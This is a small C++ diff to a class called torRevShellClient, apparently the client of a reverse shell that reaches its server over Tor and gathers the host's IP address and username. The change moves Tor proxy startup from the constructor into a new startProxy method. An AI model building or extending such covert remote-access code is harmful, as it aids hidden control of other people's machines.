@@ -13,6 +13,7 @@
 class torRevShellClient {
 private:
     torPlusPlus::torSocketExtended torSock;
+    std::string torPath;
     std::string servAddr;
     std::string publicIp;
     std::string username;
@@ -47,9 +48,17 @@ public:
         Starts TOR and sets up some basic info
     */
     torRevShellClient(std::string torPath, std::string servAddr){
-        this->torSock.startTorProxy(torPath.c_str());
+        this->torPath = torPath;
         this->servAddr = servAddr;
         this->getComputerInfo();
+    }
+
+    /*
+        Attempts to start TOR using this->torPath
+        Returns 0 on fail
+    */
+    bool startProxy() {
+        return this->torSock.startAndConnectToProxy(this->torPath.c_str());
     }
 
     /*
